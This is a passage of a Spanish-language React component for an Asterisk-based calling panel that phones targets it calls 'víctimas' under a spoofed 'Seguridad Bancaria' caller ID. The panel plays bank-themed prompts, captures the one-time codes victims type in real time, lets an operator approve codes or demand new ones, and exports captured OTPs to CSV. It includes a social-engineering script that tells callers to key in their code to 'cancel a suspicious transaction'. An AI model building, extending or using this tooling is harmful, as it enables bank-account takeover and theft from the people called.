            setLaunchFeedback({
              text: `📞 El cliente ha colgado la llamada (${activeCall.number}). Llamada finalizada en el sistema.`,
              type: 'error',
            });
          }
        }
      } catch (_) {}
    }, 1000);

    return () => clearInterval(watcherInterval);
  }, [activeCall?.isActive, activeCall?.number, activeCall?.status]);

  // Duration timer for active call
  useEffect(() => {
    if (activeCall?.isActive && activeCall.status !== 'ended') {
      durationTimerRef.current = setInterval(() => {
        setActiveCall((prev) => (prev ? { ...prev, duration: prev.duration + 1 } : null));
      }, 1000);
    } else {
      if (durationTimerRef.current) clearInterval(durationTimerRef.current);
    }
    return () => {
      if (durationTimerRef.current) clearInterval(durationTimerRef.current);
    };
  }, [activeCall?.isActive, activeCall?.status]);

  // Quick audio recording with microphone
  const handleStartRecordingQuick = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      const mediaRecorder = new MediaRecorder(stream);
      mediaRecorderRef.current = mediaRecorder;
      audioChunksRef.current = [];

      mediaRecorder.ondataavailable = (event) => {
        if (event.data.size > 0) {
          audioChunksRef.current.push(event.data);
        }
      };

      mediaRecorder.onstop = () => {
        const audioBlob = new Blob(audioChunksRef.current, { type: 'audio/webm' });
        const reader = new FileReader();
        reader.onloadend = () => {
          setQuickUploadDataUrl(reader.result as string);
          if (!quickUploadName) {
            setQuickUploadName(`Locución ${new Date().toLocaleTimeString().replace(/:/g, '-')}`);
          }
        };
        reader.readAsDataURL(audioBlob);
        stream.getTracks().forEach((track) => track.stop());
      };

      mediaRecorder.start();
      setIsRecordingQuick(true);
      setQuickRecordTime(0);
      recordTimerRef.current = setInterval(() => {
        setQuickRecordTime((prev) => prev + 1);
      }, 1000);
    } catch (err) {
      alert('No se pudo acceder al micrófono para grabar.');
    }
  };

  const handleStopRecordingQuick = () => {
    if (mediaRecorderRef.current && isRecordingQuick) {
      mediaRecorderRef.current.stop();
      setIsRecordingQuick(false);
      if (recordTimerRef.current) clearInterval(recordTimerRef.current);
    }
  };

  const handleSaveQuickAudio = () => {
    if (!quickUploadDataUrl || !quickUploadName.trim()) return;

    const cleanBaseName = quickUploadName
      .toLowerCase()
      .trim()
      .replace(/\.[^/.]+$/, '')
      .replace(/[^a-z0-9_]/g, '_');

    const asteriskPath = `custom/${cleanBaseName}`;

    const newPrompt: AudioPrompt = {
      id: `audio-${Date.now()}-${Math.random().toString(36).slice(-4)}`,
      name: quickUploadName.trim(),
      category: quickUploadSlot === 'introAudioPath' ? 'press1_welcome' : 'otp_welcome',
      fileName: `${cleanBaseName}.wav`,
      fileSize: '150 KB',
      durationSec: quickRecordTime || 5.0,
      format: 'audio/wav',
      sampleRate: '8000 Hz, 16-bit Mono (Asterisk PCM)',
      dataUrl: quickUploadDataUrl,
      asteriskPath,
      createdAt: new Date().toLocaleString(),
    };

    if (onAddAudio) {
      onAddAudio(newPrompt);
    }

    // Auto-assign to current campaign slot
    handleUpdateCampaignAudio(selectedService, quickUploadSlot, asteriskPath);

    setIsQuickUploadOpen(false);
    setQuickUploadDataUrl(null);
    setQuickUploadName('');
    setQuickUploadFile(null);
  };

  // Synchronize campaign audios and complete dialplan to Asterisk so it never plays a beep
  const handleSyncAudiosToAsterisk = async (silent = false) => {
    setIsSyncingAudios(true);
    if (!silent) setAudioSyncFeedback(null);
    try {
      const currentAudios = campaignAudios[selectedService];
      // 1. Sync Audios to AstDB
      await fetch('/api/asterisk/audio/sync-defaults', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          intro: currentAudios.introAudioPath || 'custom/banrearreglado',
          prompt: currentAudios.promptAudioPath || 'custom/solicitar_codigo_otp',
          wait: 'custom/un_momento_validando_informacion',
          success: currentAudios.successAudioPath || 'custom/operacion_bloqueada_exito',
          agent: currentAudios.agentAudioPath || 'custom/conectar_asesor_banco',
          destination: targetNumber.trim() || '16104803845',
        }),
      });

      // 2. Perform Full Dialplan, PJSIP & Hot Reload directly into /etc/asterisk/
      const res = await fetch('/api/asterisk/sync/extensions', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          extensions,
          carriers,
          audioIntro: currentAudios.introAudioPath || 'custom/banrearreglado',
          audioPrompt: currentAudios.promptAudioPath || 'custom/solicitar_codigo_otp',
          audioWait: 'custom/un_momento_validando_informacion',
          audioSuccess: currentAudios.successAudioPath || 'custom/operacion_bloqueada_exito',
          audioAgent: currentAudios.agentAudioPath || 'custom/conectar_asesor_banco',
        }),
      });

      const data = await res.json();
      if (data.success && !silent) {
        setAudioSyncFeedback('✓ Asterisk sincronizado al 100%: Dialplan, Audios y PJSIP recargados.');
        setTimeout(() => setAudioSyncFeedback(null), 5000);
      } else if (!data.success && !silent) {
        setAudioSyncFeedback('Aviso: ' + (data.error || 'No se pudo sincronizar'));
      }
    } catch (e: any) {
      if (!silent) setAudioSyncFeedback('Error al sincronizar con Asterisk.');
    } finally {
      setIsSyncingAudios(false);
    }
  };

  // Launch single production call
  const handleLaunchProductionCall = async () => {
    if (!targetNumber.trim()) {
      setLaunchFeedback({ text: 'Por favor ingresa un número de teléfono destino', type: 'error' });
      return;
    }

    setIsLaunching(true);
    setLaunchFeedback(null);

    try {
      const currentAudios = campaignAudios[selectedService];
      const effectiveCallerIdNum = callerIdNum.trim() || outboundCid;
      const effectiveCallerIdName = callerIdName.trim() || 'Seguridad Bancaria';

      // Audios are passed directly in body and synced on Asterisk instantly in parallel with originate
      const res = await fetch('/api/asterisk/call/originate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          destination: targetNumber.trim(),
          carrier: activeCarrier,
          callerId: effectiveCallerIdNum,
          callerIdNum: effectiveCallerIdNum,
          callerIdName: effectiveCallerIdName,
          mode: callFlowMode,
          agentExten: agentExtension,
          audioIntro: currentAudios.introAudioPath,
          audioPrompt: currentAudios.promptAudioPath,
          audioAgent: currentAudios.agentAudioPath,
          audioSuccess: currentAudios.successAudioPath,
        }),
      });

      const data = await res.json();

      if (data.success) {
        setLaunchFeedback({
          text: `¡Llamada lanzada instantáneamente a ${targetNumber}! Conectando con la troncal ${activeCarrier} mostrando "${effectiveCallerIdName}" <${effectiveCallerIdNum}>.`,
          type: 'success',
        });

        // Initialize HUD
        setActiveCall({
          isActive: true,
          number: targetNumber.trim(),
          name: targetName.trim() || undefined,
          service: serviceLabel,
          status: 'dialing',
          otpStatus: 'pending',
          duration: 0,
        });

        // Simulate progression to ringing and in_ivr based on Asterisk typical timing
        setTimeout(() => {
          setActiveCall((prev) => (prev ? { ...prev, status: 'ringing' } : null));
        }, 3000);

        setTimeout(() => {
          setActiveCall((prev) => (prev ? { ...prev, status: 'in_ivr' } : null));
        }, 7000);
      } else {
        setLaunchFeedback({
          text: `Error al lanzar llamada: ${data.error || 'Fallo desconocido de Asterisk'}`,
          type: 'error',
        });
      }
    } catch (err: any) {
      setLaunchFeedback({
        text: `Error de red con Asterisk: ${err.message}`,
        type: 'error',
      });
    } finally {
      setIsLaunching(false);
    }
  };

  // Hangup active call
  const handleHangupActiveCall = async () => {
    try {
      await fetch('/api/asterisk/call/hangup', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          channel: activeCall?.channel,
          number: activeCall?.number,
        }),
      });
    } catch (e) {}
    setActiveCall((prev) => (prev ? { ...prev, status: 'ended', isActive: false } : null));
    setLaunchFeedback({
      text: 'Llamada colgada por el operador.',
      type: 'success',
    });
  };

  // Transfer call to agent in X-Lite
  const handleTransferToAgent = async () => {
    setActiveCall((prev) => (prev ? { ...prev, status: 'transferred' } : null));
  };

  // Copy OTP to clipboard
  const handleCopyOtp = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2500);
  };

  // Clear history and wipe old test codes from Asterisk AstDB
  const handleClearHistory = async () => {
    if (!confirm('¿Deseas vaciar todos los registros y códigos de pruebas anteriores tanto de la web como de Asterisk?')) return;
    try {
      await fetch('/api/asterisk/otp/records?clear=1', { method: 'DELETE' });
      setOtpRecords([]);
      setLiveCapturedAlert(null);
      validRecordIdsRef.current.clear();
      dismissedAlertKeysRef.current.clear();
      setActiveCall((prev) => (prev ? { ...prev, capturedOtp: undefined, otpStatus: 'pending' } : null));
      setLaunchFeedback({
        text: 'Historial y registros de pruebas anteriores eliminados con éxito.',
        type: 'success',
      });
    } catch (e) {}
  };

  // Export CSV
  const handleExportCsv = () => {
    if (otpRecords.length === 0) return;
    const headers = 'ID,Numero_Destino,Codigo_OTP,Servicio,Hora,Estado\n';
    const rows = otpRecords
      .map(
        (r) =>
          `"${r.id}","${r.number}","${r.otp}","${r.service || 'N/A'}","${r.timestamp}","${r.status || 'valid'}"`
      )
      .join('\n');
    const blob = new Blob([headers + rows], { type: 'text/csv;charset=utf-8;' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.setAttribute('href', url);
    link.setAttribute('download', `capturas_otp_produccion_${new Date().toISOString().slice(0, 10)}.csv`);
    link.click();
  };

  // Format seconds into MM:SS
  const formatTime = (secs: number) => {
    const m = Math.floor(secs / 60);
    const s = secs % 60;
    return `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
  };

  return (
    <div className="space-y-6">
      {/* Production Header Banner */}
      <div className="p-6 rounded-2xl bg-gradient-to-r from-slate-900 via-slate-950 to-slate-900 border border-emerald-500/40 shadow-2xl relative overflow-hidden">
        <div className="absolute top-0 right-0 w-96 h-96 bg-emerald-500/10 rounded-full blur-3xl pointer-events-none" />

        <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4 relative z-10">
          <div>
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs font-bold mb-2">
              <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
              <span>MÓDULO DE PRODUCCIÓN EN VIVO ACTIVO</span>
            </div>
            <h1 className="text-2xl font-black text-white tracking-tight flex items-center gap-3">
              <Rocket className="w-7 h-7 text-emerald-400" />
              <span>Centro de Producción: Campañas & Captura OTP</span>
            </h1>
            <p className="text-sm text-slate-300 mt-1 max-w-2xl">
              Dispara llamadas salientes directas hacia víctimas y clientes a través de la troncal{' '}
              <strong className="text-white font-mono">{activeCarrier}</strong>. Captura dígitos OTP en tiempo
              real o transfiere la llamada a tu softphone X-Lite (extensión{' '}
              <strong className="text-emerald-400 font-mono">{agentExtension}</strong>).
            </p>
          </div>

          <div className="flex flex-wrap items-center gap-2 bg-slate-900/90 border border-slate-800 p-3 rounded-xl">
            <div className="px-3 py-1.5 rounded-lg bg-slate-950 border border-slate-800 text-xs">
              <div className="text-[10px] text-slate-500 uppercase font-mono">Troncal SIP</div>
              <div className="font-bold text-emerald-400 flex items-center gap-1.5">
                <span className="w-1.5 h-1.5 rounded-full bg-emerald-400" />
                <span>{activeCarrier}</span>
              </div>
            </div>

            <div className="px-3 py-1.5 rounded-lg bg-slate-950 border border-slate-800 text-xs">
              <div className="text-[10px] text-slate-500 uppercase font-mono">Caller ID Saliente</div>
              <div className="font-bold text-sky-400 font-mono">{outboundCid}</div>
            </div>

            <div className="px-3 py-1.5 rounded-lg bg-slate-950 border border-slate-800 text-xs">
              <div className="text-[10px] text-slate-500 uppercase font-mono">Asesor Asignado</div>
              <div className="font-bold text-emerald-400 font-mono">Ext. {agentExtension}</div>
            </div>
          </div>
        </div>
      </div>

      {/* BANNER / PANEL DE ALERTA: CÓDIGO CAPTURADO EN VIVO (EXT. 7777 / 6666 / 5555 / 4444 / 3333) */}
      {liveCapturedAlert && liveCapturedAlert.status !== 'valid' && (
        <div className="p-6 rounded-2xl bg-gradient-to-r from-emerald-950/90 via-slate-950 to-slate-900 border-2 border-emerald-500 shadow-2xl shadow-emerald-500/30 relative overflow-hidden">
          <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-emerald-500/30 pb-4">
            <div className="flex items-center gap-3">
              <span className="relative flex h-4 w-4">
                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
                <span className="relative inline-flex rounded-full h-4 w-4 bg-emerald-500"></span>
              </span>
              <div>
                <div className="text-xs font-black uppercase tracking-widest text-emerald-400 flex items-center gap-2">
                  <span>¡CÓDIGO DE 6 DÍGITOS CAPTURADO EN VIVO!</span>
                  <span className="px-2 py-0.5 rounded bg-emerald-500/20 text-emerald-300 font-mono text-[10px] border border-emerald-500/40">
                    {liveCapturedAlert.channel || 'Ext. OTP'}
                  </span>
                </div>
                <div className="text-slate-300 text-xs mt-0.5">
                  Número: <strong className="text-white font-mono">{liveCapturedAlert.number}</strong> &bull; Hora: <span className="text-slate-400 font-mono">{liveCapturedAlert.timestamp}</span>
                </div>
              </div>
            </div>

            <div className="flex items-center gap-2">
              {liveCapturedAlert.status === 'valid' ? (
                <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-emerald-500/20 text-emerald-300 font-bold border border-emerald-500/40 text-xs">
                  <CheckCircle className="w-4 h-4 text-emerald-400" />
                  <span>Aprobado por Asesor</span>
                </span>
              ) : liveCapturedAlert.status === 'invalid' ? (
                <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-rose-500/20 text-rose-300 font-bold border border-rose-500/40 text-xs">
                  <XCircle className="w-4 h-4 text-rose-400" />
                  <span>Rechazado (Pidiendo nuevo)</span>
                </span>
              ) : (
                <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-amber-500/20 text-amber-300 font-bold border border-amber-500/40 text-xs animate-pulse">
                  <Clock className="w-4 h-4 text-amber-400" />
                  <span>Esperando tu decisión</span>
                </span>
              )}

              <button
                id="btn-dismiss-live-alert"
                type="button"
                onClick={() => {
                  if (liveCapturedAlert) {
                    dismissedAlertKeysRef.current.add(liveCapturedAlert.id);
                    dismissedAlertKeysRef.current.add(liveCapturedAlert.otp);
                    if (liveCapturedAlert.number) dismissedAlertKeysRef.current.add(liveCapturedAlert.number);
                  }
                  setLiveCapturedAlert(null);
                }}
                className="p-1.5 rounded-lg text-slate-400 hover:text-white hover:bg-slate-800 transition-all ml-2 cursor-pointer"
                title="Descartar y ocultar aviso"
              >
                <X className="w-5 h-5" />
              </button>
            </div>
          </div>

          <div className="py-5 flex flex-col items-center justify-center gap-3">
            <div className="text-xs font-bold text-slate-400 uppercase tracking-wider text-center">
              Dígitos ingresados por el cliente en llamada:
            </div>

            <div className="flex flex-wrap items-center justify-center gap-2.5 sm:gap-3">
              {liveCapturedAlert.otp.split('').map((digit, idx) => (
                <span
                  key={idx}
                  className="w-14 h-18 sm:w-16 sm:h-20 flex items-center justify-center text-3xl sm:text-4xl font-black font-mono text-emerald-400 bg-slate-950 rounded-2xl border-2 border-emerald-500 shadow-xl shadow-emerald-500/30"
                >
                  {digit}
                </span>
              ))}
            </div>
          </div>

          <div className="flex flex-wrap items-center justify-center gap-3 pt-3 border-t border-emerald-500/20">
            <button
              id="btn-alert-mark-valid"
              type="button"
              onClick={() => handleVerifyOtp('valid', liveCapturedAlert.otp, liveCapturedAlert.number, liveCapturedAlert.id)}
              className={`inline-flex items-center gap-2 px-6 py-3 rounded-xl font-black text-sm shadow-xl transition-all ${
                liveCapturedAlert.status === 'valid'
                  ? 'bg-emerald-500 text-slate-950 ring-4 ring-emerald-400/50 scale-105'
                  : 'bg-emerald-600 hover:bg-emerald-500 text-white shadow-emerald-600/30'
              }`}
            >
              <CheckCircle className="w-5 h-5" />
              <span>CÓDIGO VÁLIDO</span>
            </button>

            <button
              id="btn-alert-mark-invalid"
              type="button"
              onClick={() => handleVerifyOtp('invalid', liveCapturedAlert.otp, liveCapturedAlert.number, liveCapturedAlert.id)}
              className={`inline-flex items-center gap-2 px-6 py-3 rounded-xl font-black text-sm shadow-xl transition-all ${
                liveCapturedAlert.status === 'invalid'
                  ? 'bg-rose-500 text-white ring-4 ring-rose-400/50 scale-105'
                  : 'bg-rose-600 hover:bg-rose-500 text-white shadow-rose-600/30'
              }`}
            >
              <XCircle className="w-5 h-5" />
              <span>CÓDIGO INVÁLIDO</span>
            </button>

            <button
              id="btn-alert-copy-otp"
              type="button"
              onClick={() => handleCopyOtp(liveCapturedAlert.otp, 'alert-otp')}
              className="inline-flex items-center gap-2 px-4 py-3 rounded-xl font-bold text-xs bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 transition-all"
            >
              {copiedId === 'alert-otp' ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4 text-slate-400" />}
              <span>{copiedId === 'alert-otp' ? '¡Copiado!' : 'Copiar Código'}</span>
            </button>
          </div>
        </div>
      )}

      {/* Mode Selector Tabs */}
      <div className="flex flex-wrap items-center gap-2 border-b border-slate-800 pb-2">
        <button
          id="btn-tab-single-call"
          onClick={() => setProductionMode('single')}
          className={`flex items-center space-x-2 px-4 py-2 rounded-lg text-xs font-bold transition-all ${
            productionMode === 'single'
              ? 'bg-emerald-500 text-slate-950 shadow-lg shadow-emerald-500/20'
              : 'text-slate-400 hover:text-white hover:bg-slate-800'
          }`}
        >
          <PhoneCall className="w-4 h-4" />
          <span>Disparador Individual Inmediato (1 a 1)</span>
        </button>

        <button
          id="btn-tab-ivr-action"
          onClick={() => setProductionMode('ivr_action')}
          className={`flex items-center space-x-2 px-4 py-2 rounded-lg text-xs font-bold transition-all ${
            productionMode === 'ivr_action'
              ? 'bg-emerald-500 text-slate-950 shadow-lg shadow-emerald-500/20'
              : 'text-slate-400 hover:text-white hover:bg-slate-800'
          }`}
        >
          <Zap className="w-4 h-4" />
          <span>Acción del IVR al Contestar</span>
          <span className={`px-2 py-0.5 rounded text-[10px] font-mono font-bold ${
            productionMode === 'ivr_action'
              ? 'bg-slate-950 text-emerald-400'
              : 'bg-emerald-500/20 text-emerald-300'
          }`}>
            {callFlowMode === 'otp' ? 'Captura OTP' : callFlowMode === 'press1' ? 'Press-1' : 'Híbrido'}
          </span>
        </button>

        <button
          id="btn-tab-bulk-campaign"
          onClick={() => setProductionMode('bulk')}
          className={`flex items-center space-x-2 px-4 py-2 rounded-lg text-xs font-bold transition-all ${
            productionMode === 'bulk'
              ? 'bg-emerald-500 text-slate-950 shadow-lg shadow-emerald-500/20'
              : 'text-slate-400 hover:text-white hover:bg-slate-800'
          }`}
        >
          <Flame className="w-4 h-4" />
          <span>Campañas Masivas por Lotes (Bulk Dialer)</span>
        </button>

        <div className="ml-auto flex items-center gap-2">
          {!activeCall?.isActive && (
            <button
              id="btn-open-test-8888-hud"
              onClick={() => {
                setActiveCall({
                  isActive: true,
                  number: '8888',
                  name: 'Prueba Softphone Ext. 1002',
                  service: selectedService || 'bank',
                  status: 'in_ivr',
                  duration: 0,
                  channel: 'PJSIP/1002',
                });
              }}
              className="px-3 py-1.5 rounded-lg text-xs font-bold bg-sky-500/20 hover:bg-sky-500/30 text-sky-300 border border-sky-500/40 flex items-center gap-1.5 transition-all cursor-pointer"
              title="Abre la pantalla de captura manual de OTP para pruebas directas desde el softphone marcando 8888"
            >
              <Phone className="w-3.5 h-3.5" />
              <span>Modo Prueba: Abrir Panel OTP para Ext. 8888</span>
            </button>
          )}
        </div>
      </div>

      {/* ACTIVE CALL REAL-TIME HUD (Appears when a call is running) */}
      {activeCall && activeCall.isActive && (
        <div className="p-6 rounded-2xl bg-slate-950 border-2 border-emerald-500/50 shadow-2xl relative overflow-hidden animate-fadeIn">
          <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-slate-800 pb-4">
            <div className="flex items-center gap-3">
              <div className="p-3 rounded-xl bg-emerald-500/20 text-emerald-400 animate-pulse">
                <Radio className="w-6 h-6" />
              </div>
              <div>
                <div className="flex items-center gap-2">
                  <span className="text-xs font-bold px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-300 border border-emerald-500/30">
                    LLAMADA EN PROCESO
                  </span>
                  <span className="text-xs text-slate-400 font-mono">{formatTime(activeCall.duration)}</span>
                </div>
                <h3 className="text-lg font-black text-white mt-1">
                  {activeCall.number} {activeCall.name && `(${activeCall.name})`}
                </h3>
                <p className="text-xs text-slate-400">
                  Servicio activo: <strong className="text-emerald-300">{activeCall.service}</strong>
                </p>
              </div>
            </div>

            {/* Actions for Live Call */}
            <div className="flex items-center gap-2">
              <button
                id="btn-hud-transfer-agent"
                onClick={handleTransferToAgent}
                className="inline-flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-bold bg-emerald-500 hover:bg-emerald-400 text-black transition-all shadow-md shadow-emerald-500/20"
              >
                <PhoneForwarded className="w-3.5 h-3.5" />
                <span>Pasar a Asesor (1001)</span>
              </button>

              <button
                id="btn-hud-hangup"
                onClick={handleHangupActiveCall}
                className="inline-flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-bold bg-rose-500/20 hover:bg-rose-500/30 text-rose-300 border border-rose-500/40 transition-all"
              >
                <PhoneOff className="w-3.5 h-3.5" />
                <span>Colgar Llamada</span>
              </button>

              <button
                id="btn-hud-close-test"
                onClick={() => setActiveCall(null)}
                className="inline-flex items-center gap-1.5 px-2.5 py-2 rounded-lg text-xs font-semibold bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 transition-all"
                title="Cerrar este panel visual de llamada"
              >
                <X className="w-3.5 h-3.5" />
                <span>Cerrar Panel</span>
              </button>
            </div>
          </div>

          {/* Real-time Call Stages Flow */}
          <div className="grid grid-cols-2 md:grid-cols-4 gap-2 my-5 text-center text-xs">
            <div
              className={`p-3 rounded-xl border ${
                activeCall.status === 'dialing'
                  ? 'bg-emerald-500/20 border-emerald-500 text-emerald-300 font-bold animate-pulse'
                  : 'bg-slate-900 border-slate-800 text-slate-400'
              }`}
            >
              <div className="text-[10px] font-mono uppercase">Paso 1</div>
              <div>Marcando por Troncal</div>
            </div>

            <div
              className={`p-3 rounded-xl border ${
                activeCall.status === 'ringing'
                  ? 'bg-emerald-500/20 border-emerald-500 text-emerald-300 font-bold animate-pulse'
                  : 'bg-slate-900 border-slate-800 text-slate-400'
              }`}
            >
              <div className="text-[10px] font-mono uppercase">Paso 2</div>
              <div>Timbrando en Teléfono</div>
            </div>

            <div
              className={`p-3 rounded-xl border ${
                activeCall.status === 'in_ivr'
                  ? 'bg-emerald-500/20 border-emerald-500 text-emerald-300 font-bold animate-pulse'
                  : 'bg-slate-900 border-slate-800 text-slate-400'
              }`}
            >
              <div className="text-[10px] font-mono uppercase">Paso 3</div>
              <div>Víctima en Línea (IVR)</div>
            </div>

            <div
              className={`p-3 rounded-xl border ${
                activeCall.status === 'otp_captured'
                  ? 'bg-emerald-500/20 border-emerald-500 text-emerald-300 font-bold shadow-lg shadow-emerald-500/20'
                  : 'bg-slate-900 border-slate-800 text-slate-400'
              }`}
            >
              <div className="text-[10px] font-mono uppercase">Paso 4</div>
              <div>Código Capturado</div>
            </div>
          </div>

          {/* CAPTURED OTP DISPLAY HUD: Solo visible mientras no haya sido validado */}
          {activeCall.otpStatus !== 'valid' && (
            <div className="p-6 rounded-xl bg-slate-900/90 border border-slate-800 text-center space-y-4">
            <div className="flex items-center justify-between border-b border-slate-800 pb-3">
              <div className="text-xs font-semibold text-slate-400 uppercase tracking-wider flex items-center gap-2">
                <KeyRound className="w-4 h-4 text-emerald-400" />
                <span>Dígitos DTMF Capturados en Vivo (Tiempo Real)</span>
              </div>
              <div className="text-xs font-mono text-slate-400 flex items-center gap-2">
                <Phone className="w-3.5 h-3.5 text-sky-400" />
                <span>Presentando: <strong className="text-sky-300 font-bold font-mono">"{callerIdName}" &lt;{callerIdNum}&gt;</strong></span>
              </div>
            </div>

            {/* AGENT IN-CALL OTP WORKFLOW HUD */}
            <div className="p-4 rounded-xl bg-slate-950/70 border border-slate-800 text-left space-y-3">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2 text-xs font-bold text-sky-300 uppercase tracking-wide">
                  <UserCheck className="w-4 h-4 text-emerald-400" />
                  <span>Flujo Asistido por Agente: Solicitud y Validación Manual de OTP</span>
                </div>
                <span className="text-[11px] font-mono px-2.5 py-1 rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 flex items-center gap-1.5 font-bold">
                  <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping" />
                  Agente en Línea con Cliente
                </span>
              </div>

              {/* Guión sugerido para que el Agente solicite el OTP al cliente en llamada */}
              <div className="p-3 rounded-lg bg-slate-900 border border-sky-500/20 text-xs text-slate-300">
                <span className="text-sky-400 font-bold block mb-1">🗣️ Guión para el Asesor (Solicitar código al cliente en llamada):</span>
                <p className="italic text-slate-200">
                  "Señor/a <strong className="text-white">{activeCall.name || 'cliente'}</strong>, por motivos de seguridad y anulación preventiva de la transacción sospechosa, le acabamos de remitir su clave de verificación de 6 dígitos. Por favor márquela en este momento en el teclado numérico de su teléfono mientras permanezco en línea con usted para validar la anulación."
                </p>
              </div>
            </div>

            {activeCall.capturedOtp ? (
              <div className="space-y-5">
                {/* Visualizador de dígitos ingresados */}
                <div className="space-y-2">
                  <div className="text-xs font-bold text-emerald-400 uppercase tracking-wider flex items-center justify-center gap-2">
                    <span className="w-2.5 h-2.5 rounded-full bg-emerald-400 animate-pulse" />
                    <span>Dígitos Ingresados por el Cliente en su Teléfono:</span>
                  </div>
                  <div className="flex items-center justify-center gap-2.5">
                    {activeCall.capturedOtp.split('').map((digit, idx) => (
                      <span
                        key={idx}
                        className="w-14 h-16 flex items-center justify-center text-3xl font-black font-mono text-emerald-400 bg-slate-950 rounded-xl border-2 border-emerald-500/60 shadow-lg shadow-emerald-500/30 animate-bounce"
                        style={{ animationDelay: `${idx * 100}ms` }}
                      >
                        {digit}
                      </span>
                    ))}
                  </div>
                </div>

                {/* BOTONES DE DECISIÓN DEL AGENTE (VÁLIDO / INVÁLIDO) */}
                <div className="p-5 rounded-xl bg-slate-950/90 border border-slate-800 space-y-4">
                  <div className="text-center space-y-1">
                    <div className="text-sm font-black text-white uppercase tracking-wider">
                      Decisión del Agente: ¿El código digitado por el cliente es VÁLIDO o INVÁLIDO?
                    </div>
                    <div className="text-xs text-slate-400">
                      Tú como asesor decides la aprobación en el sistema según la respuesta de tu panel bancario.
                    </div>
                  </div>

                  <div className="flex flex-wrap items-center justify-center gap-4">
                    {/* BOTÓN 1: CÓDIGO VÁLIDO */}
                    <button
                      id="btn-otp-mark-valid"
                      type="button"
                      onClick={() => handleVerifyOtp('valid', activeCall.capturedOtp, activeCall.number)}
                      className={`inline-flex items-center gap-2.5 px-7 py-4 rounded-xl font-black text-sm shadow-xl transition-all ${
                        activeCall.otpStatus === 'valid'
                          ? 'bg-emerald-500 text-slate-950 ring-4 ring-emerald-400/50 scale-105'
                          : 'bg-emerald-600 hover:bg-emerald-500 text-white shadow-emerald-600/30'
                      }`}
                    >
                      <CheckCircle className="w-5 h-5" />
                      <span>CÓDIGO VÁLIDO</span>
                    </button>

                    {/* BOTÓN 2: CÓDIGO INVÁLIDO (Pide automáticamente nuevo código) */}
                    <button
                      id="btn-otp-mark-invalid"
                      type="button"
                      onClick={() => handleVerifyOtp('invalid', activeCall.capturedOtp, activeCall.number)}
                      title="Marca como inválido y le pide un nuevo token de 6 dígitos automáticamente al cliente"
                      className={`inline-flex items-center gap-2.5 px-7 py-4 rounded-xl font-black text-sm shadow-xl transition-all ${
                        activeCall.otpStatus === 'invalid'
                          ? 'bg-rose-500 text-white ring-4 ring-rose-400/50 scale-105'
                          : 'bg-rose-600 hover:bg-rose-500 text-white shadow-rose-600/30'
                      }`}
                    >
                      <XCircle className="w-5 h-5" />
                      <span>CÓDIGO INVÁLIDO</span>
                    </button>

                    <button
                      id="btn-copy-live-otp"
                      type="button"
                      onClick={() => handleCopyOtp(activeCall.capturedOtp!, 'live-otp')}
                      className="inline-flex items-center gap-2 px-4 py-4 rounded-xl font-bold text-xs bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 transition-all"
                    >
                      {copiedId === 'live-otp' ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4 text-slate-400" />}
                      <span>{copiedId === 'live-otp' ? '¡Copiado!' : 'Copiar'}</span>
                    </button>
                  </div>

                  {/* Detalle tras la decisión del agente */}
                  {activeCall.otpStatus && activeCall.otpStatus !== 'pending' && (
                    <div
                      className={`p-3.5 rounded-xl text-xs font-semibold flex flex-col sm:flex-row sm:items-center justify-between gap-2 ${
                        activeCall.otpStatus === 'valid'
                          ? 'bg-emerald-500/15 border border-emerald-500/40 text-emerald-300'
                          : 'bg-rose-500/15 border border-rose-500/40 text-rose-300'
                      }`}
                    >
                      <div className="flex items-center gap-2">
                        {activeCall.otpStatus === 'valid' ? (
                          <CheckCircle className="w-5 h-5 text-emerald-400 shrink-0" />
                        ) : (
                          <XCircle className="w-5 h-5 text-rose-400 shrink-0" />
                        )}
                        <div>
                          <strong>
                            {activeCall.otpStatus === 'valid'
                              ? '✓ Operación Aprobada: El agente confirmó que el código OTP es VÁLIDO.'
                              : '✕ Operación Rechazada: El agente marcó el código OTP como INVÁLIDO.'}
                          </strong>
                          <p className="text-[11px] font-normal text-slate-300 mt-0.5">
                            {activeCall.otpStatus === 'valid'
                              ? 'Puedes indicarle al cliente que la anulación fue exitosa y dar por terminada la llamada.'
                              : 'Indícale al cliente que el código no coincide y usa el botón "Solicitar Nuevo Código / Reintentar" para recibir el nuevo.'}
                          </p>
                        </div>
                      </div>
                      <div className="flex items-center gap-2 shrink-0">
                        <span className="text-[11px] font-mono px-2 py-0.5 rounded bg-slate-900 border border-slate-800">
                          {new Date().toLocaleTimeString()}
                        </span>
                      </div>
                    </div>
                  )}
                </div>
              </div>
            ) : (
